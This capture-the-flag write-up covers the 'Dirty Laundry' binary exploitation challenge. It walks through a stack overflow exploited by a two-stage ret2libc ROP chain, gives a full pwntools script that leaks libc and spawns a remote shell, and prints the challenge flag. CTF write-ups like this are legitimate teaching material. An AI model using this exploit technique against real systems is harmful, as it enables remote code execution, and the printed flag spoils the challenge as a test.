# Dirty Laundry - CTF Writeup

**Challenge:** Dirty Laundry
**Category:** Pwn / Binary Exploitation
**Command:** `ncat --ssl dirty-laundry.ctf.prgy.in 1337`

> **Description:** The washing machine doesn't seem to work. Could you take a look?

---

## 1. Challenge Overview

**"Dirty Laundry"** was a 64-bit Linux exploitation challenge that initially presented itself as a simple logic puzzle but quickly revealed itself to be a multi-stage **Ret2Libc** attack.

* **Vulnerability:** Buffer Overflow (Stack-based).
* **Protections:** NX (No-Execute) enabled, ASLR (Address Space Layout Randomization) active.
* **Provided Files:** `chal` (binary), `libc.so.6`, and `ld.so`.

---

## 2. The "Congrats... JK" Mind Game

Initial analysis in Ghidra highlighted a function called `check_status`. If passed the argument `0xC35E415F`, it would execute a block of code that looked like a "win" condition. However, running it locally yielded the message: `Congratulations... jk`.

### The "Remote Theory"

At this point, a common CTF strategy came to mind: **"Maybe the local binary is trolling, but the remote binary is the real deal."** It is common for authors to provide a "sanitized" or "joke" binary locally while the server version contains the actual flag logic.

However, after testing the `check_status` path on the remote server and getting the same sarcastic result, it became clear that this was not just a local joke—it was a **Red Herring**. The presence of the `libc` and `ld` files was the real hint. The goal was not to call a function inside the binary; it was to escape the binary entirely and jump into `libc`.

---

## 3. The Exploit Strategy: Two-Stage Ret2Libc

With **NX** enabled, we could not execute our own shellcode. We had to use the Return-Oriented Programming (ROP) technique to bypass ASLR.

### Stage 1: The Information Leak

To call `system()`, we first needed to know where `libc` was located in memory. Since ASLR moves `libc` on every execution, we built a ROP chain to:

1. Pop the address of `puts@got` into `RDI`.
2. Call `puts@plt` to leak the absolute address of `puts`.
3. Calculate the **Libc Base Address** using the known offset.
4. **The Pivot:** Instead of letting the program crash, we returned to `RESTART_POINT` (`0x40122a`) to reset the `vuln` function for a second input.

### Stage 2: The Kill Shot (Alignment & R14)

64-bit Linux systems often require a **16-byte stack alignment** for `system()`. If the stack is misaligned by even 8 bytes, the `movaps` instruction in `libc` will trigger a Segfault.

We used a **Double RET** gadget strategy to ensure alignment. Additionally, since our gadget was `pop rdi; pop r14; ret`, we provided `elf.bss()` as a dummy value for `R14`. This ensured that `R14` held a valid, writable memory address, satisfying any internal `libc` checks that might occur during the shell spawn.

---

## 4. The Final Exploit Code

The following script automates the leak, calculates the offsets, handles the alignment, and pipes the final commands to the spawned shell.

```python
from pwn import *
import time

# Set up the binary and libc
elf = ELF('./chal')
libc = ELF('./libc.so.6')
context.binary = elf

# Gadgets discovered via ROPgadget or PwnTools
POP_RDI_R14_RET = 0x4011a7 
RET = 0x40101a 
RESTART_POINT = 0x40122a 

# Start the connection
io = remote('dirty-laundry.ctf.prgy.in', 1337, ssl=True)

# --- STAGE 1: LEAK ---
log.info("Stage 1: Leaking puts address...")
payload1 = b"A" * 72
payload1 += p64(POP_RDI_R14_RET)
payload1 += p64(elf.got['puts'])
payload1 += p64(0)               # Junk for r14
payload1 += p64(elf.plt['puts'])
payload1 += p64(RESTART_POINT)   # Return to start to send Stage 2

io.sendlineafter(b"Add your laundry: ", payload1)
io.recvuntil(b"Laundry complete")

# Parse the leak
leak = io.recvline().strip()
leaked_puts = u64(leak[-6:].ljust(8, b"\x00"))
libc.address = leaked_puts - libc.symbols['puts']
log.success(f"Libc Base Address: {hex(libc.address)}")

# --- STAGE 2: THE KILL SHOT ---
log.info("Stage 2: Executing system('/bin/sh')...")
io.recvuntil(b"Add your laundry: ")

system = libc.symbols['system']
bin_sh = next(libc.search(b"/bin/sh"))

# Double RET for 16-byte alignment
payload2 = b"A" * 72
payload2 += p64(RET)             # Alignment padding 1
payload2 += p64(RET)             # Alignment padding 2
payload2 += p64(POP_RDI_R14_RET)
payload2 += p64(bin_sh)
payload2 += p64(elf.bss())       # Point R14 to writable memory
payload2 += p64(system)

io.sendline(payload2)

# Send commands immediately to ensure they are executed before EOF
time.sleep(1)
io.sendline(b"id; ls -la; cat flag.txt")

io.interactive()

```

---

## 5. Conclusion

This challenge was a lesson in not trusting the first "easy" path provided. While the `check_status` function was a literal joke, the mechanics of the binary were standard pwn. By chaining a GOT leak with a precisely aligned second stage, we successfully gained RCE (Remote Code Execution) and retrieved the flag.

**Flag:** `p_ctf{14UnDryHASbEenSUCces$fU11YCOMP1e73d}`
